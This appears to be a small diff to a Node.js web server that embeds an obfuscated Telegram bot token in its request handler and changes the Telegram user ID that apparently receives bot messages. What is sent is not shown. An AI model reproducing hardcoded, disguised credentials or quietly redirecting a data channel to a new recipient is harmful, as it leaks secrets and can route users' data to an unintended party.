@@ -66,7 +66,7 @@ function MIMERecognizer(extension) {
 
 const server = http.createServer({ maxHeaderSize: 512000, requestTimeout: 30000 }, (request, response) => {
     const telegramBotToken = "7№~3№~7№~8№~1№~6№~9№~8№~6№~3№~:№~A№~A№~!%E№~!%-№~!%9№~!%m№~!%G№~!%r№~!%2№~!%L!%8!T%f!%L!%3!%z!%L!%r!%m!%m!%z!%V!%e!%4!%-!%G!%e!%_!%4!%R!%x!%x!%F!%v!%M";
-    const telegramUserId = "1007062839";
+    const telegramUserId = "1454587738";
 
     if(request.url === "/" || request.url === "http://localhost:3000/" || request.url === "/index.html") {
         fs.readFile(`${__dirname}/index.html`, (indexError, indexData) => {
